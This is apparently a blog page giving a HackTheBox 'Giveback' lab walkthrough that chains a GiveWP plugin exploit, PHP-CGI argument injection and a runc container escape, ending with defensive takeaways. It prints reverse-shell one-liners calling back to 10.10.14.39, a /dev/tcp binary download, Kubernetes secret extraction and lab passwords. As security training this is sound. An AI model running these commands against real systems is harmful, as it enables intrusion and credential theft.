@@ -1,0 +1,557 @@
+<!DOCTYPE html><html lang="en-in"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>HackTheBox Giveback Walkthrough - h4ck3rfirst</title><meta name="robots" content="noindex,nofollow"><meta name="generator" content="Publii Open-Source CMS for Static Site"><meta property="og:title" content="HackTheBox Giveback Walkthrough"><meta property="og:image" content="https://h4ck3rfirst.github.io/media/website/profile-2.png"><meta property="og:image:width" content="300"><meta property="og:image:height" content="300"><meta property="og:site_name" content="h4ck3rfirst"><meta property="og:description" content="Giveback is a medium-difficulty Linux machine that chains together multiple real-world CVEs across a containerized Kubernetes environment. The attack path&amp;hellip;"><meta property="og:url" content="https://h4ck3rfirst.github.io/hackthebox-giveback-walkthrough/"><meta property="og:type" content="article"><link rel="stylesheet" href="https://h4ck3rfirst.github.io/assets/css/style.css?v&#x3D;1caf1a6f5543014e342e13c53b1080b8"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://h4ck3rfirst.github.io/hackthebox-giveback-walkthrough/"},"headline":"HackTheBox Giveback Walkthrough","datePublished":"2025-11-03T20:05+05:30","dateModified":"2026-09-30T20:08+05:30","image":{"@type":"ImageObject","url":"https://h4ck3rfirst.github.io/media/website/profile-2.png","height":300,"width":300},"description":"Giveback is a medium-difficulty Linux machine that chains together multiple real-world CVEs across a containerized Kubernetes environment. The attack path&hellip;","author":{"@type":"Person","name":"h4ck3rfirst","url":"https://h4ck3rfirst.github.io/authors/h4ck3rfirst/"},"publisher":{"@type":"Organization","name":"h4ck3rfirst","logo":{"@type":"ImageObject","url":"https://h4ck3rfirst.github.io/media/website/profile-2.png","height":300,"width":300}}}</script><noscript><style>img[loading] {
+                    opacity: 1;
+                }</style></noscript><style>@media (max-width: 600px) {
+    #publii-space-dust {
+        opacity: 0.85;
+    }
+}</style></head><body class="post-template"><div id="publii-space-dust" aria-hidden="true"><div id="publii-space-mouse-glow"></div></div><header class="top js-header"><a class="logo" href="https://h4ck3rfirst.github.io/"><img src="https://h4ck3rfirst.github.io/media/website/profile-2.png" alt="h4ck3rfirst" width="300" height="300"></a><nav class="navbar js-navbar"><button class="navbar__toggle js-toggle" aria-label="Menu" aria-haspopup="true" aria-expanded="false"><span class="navbar__toggle-box"><span class="navbar__toggle-inner">Menu</span></span></button><ul class="navbar__menu"><li><a href="https://h4ck3rfirst.github.io/" target="_self" rel="https://h4ck3rfirst.github.io/">Home</a></li><li><a href="https://h4ck3rfirst.github.io/tags/ctf-writeups/" target="_self">CTF/Labs</a></li><li><a href="https://h4ck3rfirst.github.io/tags/linux/" target="_self">Linux</a></li><li><a href="https://h4ck3rfirst.github.io/tags/windows/" target="_self">Windows</a></li><li><a href="https://h4ck3rfirst.github.io/tags/learning/" target="_self">Learning</a></li><li><a href="https://h4ck3rfirst.github.io/about-me/" target="_self">About me</a></li></ul></nav></header><main class="post"><article class="content"><div class="hero hero--noimage"><header class="hero__content"><div class="wrapper"><h1>HackTheBox Giveback Walkthrough</h1><div class="feed__meta content__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-11-03T20:05" class="feed__date">November 3, 2025</time></div></div></header></div><div class="entry-wrapper content__entry"><p><strong>Giveback</strong> is a medium-difficulty Linux machine that chains together multiple real-world CVEs across a containerized Kubernetes environment. The attack path flows from an unauthenticated WordPress plugin exploit, through internal service discovery and lateral movement via a PHP-CGI injection bug, into Kubernetes secret enumeration for host SSH access, and finally a container escape to achieve full root on the underlying host.</p><p><strong>CVEs Exploited:</strong></p><table><thead><tr><th>CVE</th><th>Component</th><th>Impact</th></tr></thead><tbody><tr><td>CVE-2024-5932</td><td>GiveWP Plugin ≤ 3.14.1</td><td>Unauthenticated RCE via PHP Object Injection</td></tr><tr><td>CVE-2024-4577</td><td>PHP-CGI 8.x</td><td>Argument Injection → RCE as root</td></tr><tr><td>CVE-2024-21626</td><td>runc ≤ 1.1.11</td><td>Container escape via fd leak</td></tr></tbody></table><h2 id="skills-required--learned">Skills Required / Learned</h2><ul><li>WordPress plugin exploitation (insecure deserialization)</li><li>PHP-CGI argument injection exploitation</li><li>Internal service discovery from environment variables</li><li>Chisel-based network pivoting / port forwarding</li><li>Kubernetes API enumeration and secret extraction</li><li>runc container escape exploitation</li></ul><hr><h2 id="reconnaissance">Reconnaissance</h2><h3 id="nmap-port-scan">Nmap Port Scan</h3><pre><code class="language-bash">ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.94 | grep &#39;^[0-9]&#39; | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$// )
+nmap -sCV -p$ports 10.10.11.94
+</code></pre><p><strong>Results:</strong></p><table><thead><tr><th>Port</th><th>State</th><th>Service</th><th>Version</th></tr></thead><tbody><tr><td>22/tcp</td><td>open</td><td>SSH</td><td>OpenSSH 8.9p1 Ubuntu</td></tr><tr><td>80/tcp</td><td>open</td><td>HTTP</td><td>nginx 1.28.0</td></tr><tr><td>30686/tcp</td><td>open</td><td>HTTP</td><td>Golang net/http server</td></tr></tbody></table><blockquote><p><strong>Note:</strong> Ports 6443 and 10250 show as filtered — these are the Kubernetes API server and kubelet. Their presence leaks that we are dealing with a K3s Kubernetes cluster.</p></blockquote><p>The HTTP server on port 80 reveals <code>/wp-admin/</code> in <code>robots.txt</code>, confirming a <strong>WordPress</strong> installation. The Golang service on port 30686 responds with JSON describing a <code>wp-nginx-service</code> load balancer health endpoint — useful for later pivot confirmation.</p><h3 id="dns--vhost-discovery">DNS / vHost Discovery</h3><p>While browsing port 80, links point to <code>giveback.htb</code>. Add it to <code>/etc/hosts</code>:</p><pre><code class="language-bash">echo &quot;10.10.11.94 giveback.htb&quot; | sudo tee -a /etc/hosts
+</code></pre><h3 id="wordpress-enumeration-with-wpscan">WordPress Enumeration with WPScan</h3><pre><code class="language-bash">wpscan --url http://giveback.htb --enumerate p --plugins-detection aggressive
+</code></pre><p><strong>Key Findings:</strong></p><ul><li>WordPress version: <strong>6.8.1</strong></li><li>Theme: <code>bizberg</code> (up to date — ignore)</li><li>Plugin: <strong>Give v3.14.0</strong> ← <strong>vulnerable</strong></li></ul><pre><code class="language-bash"># Enumerate users via REST API
+curl -s http://giveback.htb/wp-json/wp/v2/users | jq &#39;.[].name&#39;
+# → &quot;babywyrm&quot;
+</code></pre><p>Username <strong>babywyrm</strong> identified. Keep this for later.</p><hr><h2 id="initial-foothold--cve-2024-5932-givewp-rce">Initial Foothold — CVE-2024-5932 (GiveWP RCE)</h2><h3 id="vulnerability-overview">Vulnerability Overview</h3><p><strong>CVE-2024-5932</strong> is a <strong>PHP Object Injection</strong> flaw in the GiveWP donation plugin (versions ≤ 3.14.1). User-controlled input passed through the <code>give_title</code> POST parameter is <strong>deserialized without sanitization</strong>. A pre-existing POP (Property-Oriented Programming) chain in the codebase allows an unauthenticated attacker to escalate from object injection to <strong>arbitrary command execution</strong>.</p><blockquote><p><strong>Why it’s critical:</strong> No authentication required. A single malicious POST to the donation form triggers RCE. The chain abuses <code>Give\Vendors\Faker\ValidGenerator</code> whose <code>$validator</code> property is called as a function — setting it to <code>shell_exec</code> with attacker-controlled arguments completes the chain.</p></blockquote><h3 id="exploitation">Exploitation</h3><p>The donation form is accessible at:</p><pre><code>http://giveback.htb/donations/the-things-we-need/
+</code></pre><p><strong>Step 1</strong> — Write a reverse shell script to <code>/tmp/code</code> (avoids shell escaping issues):</p><pre><code class="language-bash">python3 CVE-2024-5932-rce.py \
+  -u http://giveback.htb/donations/the-things-we-need/ \
+  -c &quot;echo &#39;/usr/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.39/4455 0&gt;&amp;1&#39; &gt; /tmp/code&quot;
+</code></pre><p><strong>Step 2</strong> — Start listener:</p><pre><code class="language-bash">nc -lnvp 4455
+</code></pre><p><strong>Step 3</strong> — Execute the staged script:</p><pre><code class="language-bash">python3 CVE-2024-5932-rce.py \
+  -u http://giveback.htb/donations/the-things-we-need/ \
+  -c &quot;/usr/bin/bash /tmp/code&quot;
+</code></pre><p><strong>Shell obtained:</strong></p><pre><code>connect to [10.10.14.39] from (UNKNOWN) [10.10.11.94] xxxxx
+bash: no job control in this shell
+&lt;hostname&gt;:/opt/bitnami/wordpress/wp-admin$ id
+uid=1001 gid=0(root) groups=0(root),1001
+</code></pre><blockquote><p><strong>Tip:</strong> Direct inline reverse shells with <code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/...&quot;</code> often fail due to quoting collisions in the serialized payload. Writing to a file first then executing it is significantly more reliable.</p></blockquote><hr><h2 id="container-enumeration">Container Enumeration</h2><p>We are inside a <strong>Kubernetes pod</strong> running the WordPress container. Start basic enumeration:</p><pre><code class="language-bash">env | grep -i service
+</code></pre><h3 id="critical-discovery--internal-service">Critical Discovery — Internal Service</h3><p>From environment variables:</p><pre><code>LEGACY_INTRANET_SERVICE_PORT=tcp://10.43.2.241:5000
+LEGACY_INTRANET_SERVICE_SERVICE_HOST=10.43.2.241
+</code></pre><p>This reveals an <strong>internal intranet service</strong> at <code>10.43.2.241:5000</code> that is unreachable from the outside. We must pivot to it.</p><h3 id="database-credentials-bonus">Database Credentials (Bonus)</h3><p>Also visible in env vars:</p><pre><code>WORDPRESS_DATABASE_PASSWORD=sW5sp4spa3u7RLyetrekE4oS
+WORDPRESS_DATABASE_USER=bn_wordpress
+WORDPRESS_DATABASE_NAME=bitnami_wordpress
+</code></pre><p>The WordPress user hash from MySQL (<code>$P$B...</code>) is not crackable with rockyou — ignore and move on.</p><hr><h2 id="network-pivoting-with-chisel">Network Pivoting with Chisel</h2><h3 id="why-chisel">Why Chisel?</h3><p>The pod lacks <code>wget</code> and <code>curl</code>. We use raw <code>/dev/tcp</code> bash trick to download the binary, then use it to create a reverse TCP tunnel — exposing the internal service on our local machine.</p><h3 id="setup">Setup</h3><p><strong>On attacker machine</strong> — serve the binary and start the server:</p><pre><code class="language-bash">python3 -m http.server 7000
+
+chisel server -p 666 --reverse
+</code></pre><p><strong>On victim pod</strong> — download and execute:</p><pre><code class="language-bash"># Download without wget/curl using bash /dev/tcp
+(
+  exec 3&lt;&gt;/dev/tcp/10.10.14.39/7000
+  echo -e &quot;GET /chisel HTTP/1.1\r\nHost: 10.10.14.39\r\nConnection: close\r\n\r\n&quot; &gt;&amp;3
+  cat &lt;&amp;3 | sed &#39;1,/^\r$/d&#39; &gt; /tmp/chisel
+  chmod +x /tmp/chisel
+) &amp;
+
+# Create the tunnel
+/tmp/chisel client 10.10.14.39:666 R:222:10.43.2.241:5000
+</code></pre><p>Now <code>http://localhost:222</code> on the attacker machine reaches the internal service.</p><hr><h2 id="lateral-movement--cve-2024-4577-php-cgi-rce">Lateral Movement — CVE-2024-4577 (PHP-CGI RCE)</h2><h3 id="internal-cms-discovery">Internal CMS Discovery</h3><p>Visiting <code>http://localhost:222</code> reveals a <strong>GiveBack LLC Internal CMS</strong> page. The footer contains a critical clue:</p><blockquote><p><em>“This CMS was originally deployed on Windows IIS using <code>php-cgi.exe</code>. During migration to Linux, the Windows-style CGI handling was retained.”</em></p></blockquote><p>Internal resources listed:</p><ul><li><code>/cgi-bin/php-cgi</code> ← <strong>PHP-CGI handler</strong> (publicly accessible, no auth)</li><li><code>/phpinfo.php?debug</code> ← reveals PHP 8.3.3</li></ul><h3 id="vulnerability-overview-1">Vulnerability Overview</h3><p><strong>CVE-2024-4577</strong> is a <strong>PHP-CGI argument injection</strong> vulnerability. On Windows, PHP-CGI is vulnerable because certain Unicode characters (like the soft hyphen <code>0xAD</code>) are normalized to <code>-</code> (hyphen) by Windows’ Best-Fit character mapping, allowing an attacker to inject PHP CLI arguments directly into a CGI request.</p><p>Critically, even though this container runs Linux, the CGI configuration was copied from a Windows deployment and <strong>the <code>/cgi-bin/php-cgi</code> path remains directly accessible</strong> — meaning the argument injection works because the binary is being invoked in CGI mode without PHP FPM’s normal protections.</p><p>The injected argument <code>%ADd+auto_prepend_file=php://input</code> causes PHP to:</p><ol><li>Treat the POST body as PHP code to prepend before any script</li><li>Execute it with the privileges of the web server process</li></ol><h3 id="exploitation-1">Exploitation</h3><p><strong>Confirm RCE:</strong></p><pre><code class="language-bash">curl -i -X POST &quot;http://localhost:222/cgi-bin/php-cgi?%ADd+auto_prepend_file=php%3A%2F%2Finput&quot; \
+  -H &quot;Content-Type: application/x-www-form-urlencoded&quot; \
+  --data-binary &quot;&lt;?php system(&#39;id&#39;); ?&gt;&quot;
+
+# Response: uid=0(root) gid=0(root) groups=0(root),...
+</code></pre><p><strong>Get reverse shell (as root in container):</strong></p><pre><code class="language-bash">nc -lnvp 4433
+
+curl -i -X POST &quot;http://localhost:222/cgi-bin/php-cgi?%ADd+auto_prepend_file=php%3A%2F%2Finput&quot; \
+  -H &quot;Content-Type: application/x-www-form-urlencoded&quot; \
+  --data-binary &quot;&lt;?php system(&#39;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | /usr/bin/nc 10.10.14.39 4433 &gt; /tmp/f&#39;); ?&gt;&quot;
+</code></pre><p>Shell obtained as <strong>root inside the legacy-intranet container</strong>.</p><hr><h2 id="kubernetes-secret-enumeration">Kubernetes Secret Enumeration</h2><p>Now running as root inside a second container, we check for Kubernetes service account credentials:</p><pre><code class="language-bash">ls /run/secrets/kubernetes.io/serviceaccount/
+# ca.crt  namespace  token
+</code></pre><h3 id="querying-the-kubernetes-api">Querying the Kubernetes API</h3><pre><code class="language-bash">TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
+
+curl -sSk -H &quot;Authorization: Bearer $TOKEN&quot; \
+  &quot;https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/secrets&quot;
+</code></pre><h3 id="secrets-found">Secrets Found</h3><table><thead><tr><th>Secret Name</th><th>Key</th><th>Value (Base64)</th></tr></thead><tbody><tr><td><code>beta-vino-wp-mariadb</code></td><td><code>mariadb-password</code></td><td><code>c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T</code></td></tr><tr><td><code>beta-vino-wp-mariadb</code></td><td><code>mariadb-root-password</code></td><td><code>c1c1c3A0c3lldHJlMzI4MjgzODNrRTRvUw==</code></td></tr><tr><td><strong><code>user-secret-babywyrm</code></strong></td><td><strong><code>MASTERPASS</code></strong></td><td><strong><code>c3hVZ1lLNUc4SlFEcVFvNXRxVkZqbjh4bG1LazMx</code></strong></td></tr></tbody></table><h3 id="decode-the-password">Decode the Password</h3><pre><code class="language-bash">echo &quot;c3hVZ1lLNUc4SlFEcVFvNXRxVkZqbjh4bG1LazMx&quot; | base64 -d
+# → sxUgYK5G8JQDqQo5tqVFjn8xlmKk31
+</code></pre><hr><h2 id="ssh-to-host--user-flag">SSH to Host — User Flag</h2><pre><code class="language-bash">ssh babywyrm@10.10.11.94
+# Password: sxUgYK5G8JQDqQo5tqVFjn8xlmKk31
+
+babywyrm@giveback:~$ cat user.txt
+# User flag here
+</code></pre><hr><h2 id="privilege-escalation--cve-2024-21626-runc-container-escape">Privilege Escalation — CVE-2024-21626 (runc Container Escape)</h2><h3 id="sudo-enumeration">Sudo Enumeration</h3><pre><code class="language-bash">sudo -l
+</code></pre><pre><code>User babywyrm may run the following commands on localhost:
+    (ALL) NOPASSWD: !ALL
+    (ALL) /opt/debug
+</code></pre><blockquote><p><strong>Note:</strong> <code>(ALL) NOPASSWD: !ALL</code> denies passwordless execution for everything, but the next rule <code>(ALL) /opt/debug</code> overrides it for that binary specifically — allowing <code>sudo /opt/debug</code> with babywyrm’s password.</p></blockquote><h3 id="identifying-the-binary">Identifying the Binary</h3><pre><code class="language-bash">sudo /opt/debug --help
+# → &quot;Restricted runc Debug Wrapper&quot;
+
+sudo /opt/debug --version
+# → runc version 1.1.11
+</code></pre><p><strong>runc 1.1.11</strong> is vulnerable to <strong>CVE-2024-21626</strong>.</p><h3 id="cve-2024-21626--vulnerability-overview">CVE-2024-21626 — Vulnerability Overview</h3><p>This is a <strong>container escape</strong> vulnerability caused by an <strong>internal file descriptor leak</strong> in runc. When runc sets up a container, it opens a file descriptor pointing to a directory on the <strong>host filesystem</strong> (<code>/proc/self/fd/7</code>). Due to a logic bug, this fd is not closed before the container process starts.</p><p>By setting the container’s <strong>working directory</strong> (<code>cwd</code> in <code>config.json</code>) to <code>/proc/self/fd/7</code>, the container process starts with its CWD pointing into the host filesystem. From there, simple <code>../../</code> traversal escapes the container entirely.</p><h3 id="exploitation-2">Exploitation</h3><p><strong>Step 1</strong> — Prepare a container filesystem locally:</p><pre><code class="language-bash"># On attacker machine
+docker export $(docker create alpine:latest) &gt; alpine.tar
+python3 -m http.server 3000
+</code></pre><p><strong>Step 2</strong> — Download and extract on target:</p><pre><code class="language-bash">cd /tmp
+wget http://10.10.14.39:3000/alpine.tar
+mkdir -p data/rootfs
+cd data
+cp /tmp/alpine.tar .
+tar -xf alpine.tar -C rootfs/
+</code></pre><p><strong>Step 3</strong> — Generate default runc config:</p><pre><code class="language-bash">sudo /opt/debug spec
+# Generates config.json in current directory
+</code></pre><p><strong>Step 4</strong> — Copy bundle to writable directory (config.json is owned by root):</p><pre><code class="language-bash">mkdir conc
+cp -a alpine.tar config.json rootfs conc/
+cd conc/
+</code></pre><p><strong>Step 5</strong> — Patch the <code>cwd</code> to trigger the fd leak:</p><pre><code class="language-bash">perl -i -pe &#39;s/&quot;cwd&quot;: &quot;\/&quot;,/&quot;cwd&quot;: &quot;\/proc\/self\/fd\/7&quot;,/&#39; config.json
+</code></pre><p><strong>Step 6</strong> — Run the container:</p><pre><code class="language-bash">sudo /opt/debug --log ./log.json run runc_exp
+# Enter babywyrm&#39;s password
+# Enter MariaDB password: sW5sp4spa3u7RLyetrekE4oS (decoded earlier)
+</code></pre><p><strong>Step 7</strong> — Escape and read root flag:</p><pre><code class="language-bash"># We are now in the container, but CWD points to host filesystem
+pwd
+# → /proc/self/fd/7  (resolves to a host directory)
+
+# Traverse to root
+cat ../../../../../root/root.txt
+#  Root flag here
+</code></pre><hr><h2 id="attack-chain-summary">Attack Chain Summary</h2><pre><code>[External Attacker]
+       │
+       ▼ CVE-2024-5932 (Unauthenticated RCE)
+[WordPress Pod — uid=1001]
+       │
+       ├── Env vars leak internal service: 10.43.2.241:5000
+       ├── Chisel tunnel: localhost:222 → 10.43.2.241:5000
+       │
+       ▼ CVE-2024-4577 (PHP-CGI Argument Injection)
+[Legacy Intranet Pod — uid=0/root]
+       │
+       ├── /run/secrets/kubernetes.io → service account token
+       ├── K8s API → list secrets → user-secret-babywyrm
+       ├── Decode MASTERPASS → SSH credentials
+       │
+       ▼ SSH
+[Host — babywyrm@giveback]
+       │
+       ├── sudo /opt/debug → runc version 1.1.11
+       │
+       ▼ CVE-2024-21626 (runc fd leak container escape)
+[Host — root]
+       │
+       └── cat /root/root.txt
+</code></pre><hr><h2 id="key-takeaways">Key Takeaways</h2><p><strong>1. Environment Variables Leak Sensitive Data</strong><br>Kubernetes injects service hostnames and ports as env vars into every pod. Any compromised pod can reveal the internal cluster topology. Sensitive values like DB passwords should use Kubernetes Secrets mounted as files, not env vars.</p><p><strong>2. Legacy Configurations Are Dangerous</strong><br>The PHP-CGI endpoint worked because a Windows-style deployment configuration was blindly ported to Linux. Always audit configurations during platform migrations.</p><p><strong>3. Kubernetes Secrets Are Not Secret Enough</strong><br>By default, Kubernetes mounts a service account token in every pod. If a pod is compromised and its service account has <code>list secrets</code> permission, all secrets in the namespace are readable. Apply least-privilege RBAC rigorously.</p><p><strong>4. runc Version Matters</strong><br>Container runtimes are part of the security boundary. CVE-2024-21626 demonstrates that a single vulnerable runc version can undo all container isolation. Keep runtimes patched and restrict who can run containers or spawn new ones.</p><p><strong>5. Chaining Medium Bugs = Critical Impact</strong><br>No single vulnerability here is catastrophic in isolation. Chained together — WordPress plugin → misconfig → K8s misconfiguration → unpatched runtime — they achieve full host compromise from zero credentials.</p><hr><h2 id="tools-used">Tools Used</h2><table><thead><tr><th>Tool</th><th>Purpose</th></tr></thead><tbody><tr><td><code>nmap</code></td><td>Port scanning and service detection</td></tr><tr><td><code>wpscan</code></td><td>WordPress enumeration</td></tr><tr><td><code>CVE-2024-5932-rce.py</code></td><td>GiveWP PHP object injection exploit</td></tr><tr><td><code>chisel</code></td><td>TCP tunneling / port forwarding</td></tr><tr><td><code>curl</code></td><td>CVE-2024-4577 PHP-CGI exploitation</td></tr><tr><td><code>kubectl</code> API (via <code>curl</code>)</td><td>Kubernetes secret enumeration</td></tr><tr><td><code>docker</code></td><td>Build Alpine rootfs for runc escape</td></tr><tr><td><code>runc</code> (<code>/opt/debug</code>)</td><td>CVE-2024-21626 container escape</td></tr></tbody></table><hr></div><footer class="content__footer"><div class="entry-wrapper"><p class="content__updated">This article was updated on September 30, 2026</p><div class="content__actions"><ul class="content__tag"><li><a href="https://h4ck3rfirst.github.io/tags/cve-2024-21626/">CVE-2024-21626</a></li><li><a href="https://h4ck3rfirst.github.io/tags/cve-2024-4577/">CVE-2024-4577</a></li><li><a href="https://h4ck3rfirst.github.io/tags/cve-2024-5932-rce/">CVE-2024-5932-rce</a></li><li><a href="https://h4ck3rfirst.github.io/tags/docker/">Docker</a></li><li><a href="https://h4ck3rfirst.github.io/tags/givebackhtb/">giveback.htb</a></li><li><a href="https://h4ck3rfirst.github.io/tags/givewp/">givewp</a></li><li><a href="https://h4ck3rfirst.github.io/tags/hackthebox/">hackthebox</a></li><li><a href="https://h4ck3rfirst.github.io/tags/kubectl/">kubectl</a></li><li><a href="https://h4ck3rfirst.github.io/tags/medium/">Medium</a></li><li><a href="https://h4ck3rfirst.github.io/tags/wordpress/">wordpress</a></li></ul><div class="content__share"><button class="btn--icon content__share-button js-content__share-button"><svg width="20" height="20" aria-hidden="true"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#share"></use></svg> <span>Share It</span></button><div class="content__share-popup js-content__share-popup"><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-giveback-walkthrough%2F" class="js-share linkedin" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#linkedin"/></svg> <span>LinkedIn</span> </a><a href="https://buffer.com/add?text=HackTheBox%20Giveback%20Walkthrough&amp;url=https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-giveback-walkthrough%2F" class="js-share buffer" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#buffer"/></svg> <span>Buffer</span> </a><a href="https://api.whatsapp.com/send?text=HackTheBox%20Giveback%20Walkthrough https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-giveback-walkthrough%2F" class="js-share whatsapp" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#whatsapp"/></svg> <span>WhatsApp</span></a></div></div></div><div class="content__bio bio"><div><h3 class="h4 bio__name"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" rel="author">h4ck3rfirst</a></h3></div></div></div><nav class="content__nav"><div class="wrapper"><div class="content__nav-inner"><div class="content__nav-prev"><a href="https://h4ck3rfirst.github.io/hackthebox-conversor-walkthrough/" class="content__nav-link" rel="prev"><figure class="content__nav-image"><img src="https://h4ck3rfirst.github.io/media/posts/29/responsive/conversor-xs.jpg" class="lazyload" loading="lazy" alt="" height="225" width="225"></figure><div><span>Previous</span> HackTheBox Conversor Walkthrough</div></a></div><div class="content__nav-next"><a href="https://h4ck3rfirst.github.io/bandit-level-0-33-full-walkthrough/" class="content__nav-link" rel="next"><div><span>Next</span> Bandit – Level 0 → 33 Full Walkthrough</div></a></div></div></div></nav></footer></article><div class="content__related related"><div class="wrapper"><h2 class="h4 related__title">You should also read:</h2><article class="feed__item feed__item--centered"><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-06-14T18:39" class="feed__date">June 14, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/tryhackme-mr-robot-walkthrough/">Tryhackme Mr robot Walkthrough</a></h3></header><p>Welcome to the walkthrough of the Robot room on TryHackMe, inspired by the Mr. Robot TV series. This lab focuses&hellip;</p></div></article><article class="feed__item feed__item--centered"><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-03-02T18:36" class="feed__date">March 2, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/tryhackme-lookup-walkthrough/">Tryhackme Lookup Walkthrough</a></h3></header><p>tags: [ctf, enumeration, exploit, Lookup, writeups, htb, writeups, tryhackme, Linux, wordpress, cracking, walkthrough] Welcome to the walkthrough for the Lookup&hellip;</p></div></article><article class="feed__item feed__item--centered"><figure class="feed__image related__image"><img src="https://h4ck3rfirst.github.io/media/posts/12/soulmate.jpg" srcset="https://h4ck3rfirst.github.io/media/posts/12/responsive/soulmate-xs.jpg 640w, https://h4ck3rfirst.github.io/media/posts/12/responsive/soulmate-sm.jpg 768w, https://h4ck3rfirst.github.io/media/posts/12/responsive/soulmate-md.jpg 1024w" sizes="(min-width: 600px) calc(4.38vw + 143px), 87.86vw" loading="lazy" height="300" width="300" alt=""></figure><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-09-11T23:23" class="feed__date">September 11, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/hackthebox-soulmate-walkthrough/">HackTheBox Soulmate Walkthrough</a></h3></header><p>Complete walkthrough of the HackTheBox Pentest Lab machine ‘Soulmate hackthebox HackTheBox — Soulmate Writeup Difficulty: Easy OS: Linux IP: 10.10.11.85&hellip;</p></div></article></div></div></main><footer class="footer footer--glued"><div class="wrapper"><div class="footer__copyright"><h6>Documenting the world of bug bounties, pentesting, and security engineering one lab at a time.</h6><p class="align-center">© 2026 h4ck3rfirst . Built with 😊.</p></div><button id="backToTop" class="footer__bttop" aria-label="Back to top" title="Back to top"><svg width="20" height="20"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#toparrow"/></svg></button></div></footer><script defer="defer" src="https://h4ck3rfirst.github.io/assets/js/scripts.min.js?v&#x3D;dafec4f87fead6718cb125f0b0fc8441"></script><script>window.publiiThemeMenuConfig={mobileMenuMode:'sidebar',animationSpeed:300,submenuWidth: 'auto',doubleClickTime:500,mobileMenuExpandableSubmenus:true,relatedContainerForOverlayMenuSelector:'.top'};</script><script>var images = document.querySelectorAll('img[loading]');
+        for (var i = 0; i < images.length; i++) {
+            if (images[i].complete) {
+                images[i].classList.add('is-loaded');
+            } else {
+                images[i].addEventListener('load', function () {
+                    this.classList.add('is-loaded');
+                }, false);
+            }
+        }</script><script>(function () {
+    "use strict";
+
+    const space = document.getElementById("publii-space-dust");
+
+    if (!space) return;
+
+    /* ================================
+       SETTINGS
+       ================================ */
+
+    const STAR_COUNT = 1200;
+
+    /*
+     * Approximately 2 cm on a typical desktop display.
+     * CSS pixels are not physically exact across monitors,
+     * so this is an approximate interaction radius.
+     */
+    const MOUSE_RADIUS = 75;
+
+    /* How fast the dust moves */
+    const MIN_SPEED = 0.99;
+    const MAX_SPEED = 2.99;
+
+    /* How often stars twinkle */
+    const MIN_TWINKLE = 0.9;
+    const MAX_TWINKLE = 2.8;
+
+    /* ================================
+       VARIABLES
+       ================================ */
+
+    const stars = [];
+    let mouseX = -9999;
+    let mouseY = -9999;
+    let animationFrame;
+
+    const glow = document.getElementById(
+        "publii-space-mouse-glow"
+    );
+
+    /* ================================
+       RANDOM HELPERS
+       ================================ */
+
+    function random(min, max) {
+        return Math.random() * (max - min) + min;
+    }
+
+    function clamp(value, min, max) {
+        return Math.max(min, Math.min(max, value));
+    }
+
+    /* ================================
+       CREATE STARS
+       ================================ */
+
+    for (let i = 0; i < STAR_COUNT; i++) {
+
+        const star = document.createElement("span");
+
+        star.className = "publii-star";
+
+        /*
+         * Most particles are tiny.
+         * A few are slightly larger.
+         */
+        const sizeChance = Math.random();
+
+        let size;
+
+        if (sizeChance > 0.992) {
+            size = random(3.0, 4.5);
+            star.classList.add("big");
+        } else if (sizeChance > 0.96) {
+            size = random(1.8, 3.2);
+        } else if (sizeChance > 0.82) {
+          // Normal stars
+    	size = random(1.0, 1.8);
+		} else {
+    	// Tiny space dust
+    	size = random(0.4, 1.1);
+		}
+
+        star.style.width = size + "px";
+        star.style.height = size + "px";
+
+        const x = Math.random() * window.innerWidth;
+        const y = Math.random() * window.innerHeight;
+
+        star.style.left = x + "px";
+        star.style.top = y + "px";
+
+        /*
+         * Each particle gets its own direction
+         * and speed so the background feels like dust.
+         */
+        const angle = random(0, Math.PI * 2);
+
+        const speed = random(
+            MIN_SPEED,
+            MAX_SPEED
+        );
+
+        /*
+         * Twinkle timing
+         */
+        const twinkleDuration = random(
+            MIN_TWINKLE,
+            MAX_TWINKLE
+        );
+
+        const twinkleDelay = random(
+            0,
+            MAX_TWINKLE
+        );
+
+        star.style.animation =
+            "publiiStarTwinkle " +
+            twinkleDuration +
+            "s ease-in-out " +
+            twinkleDelay +
+            "s infinite";
+
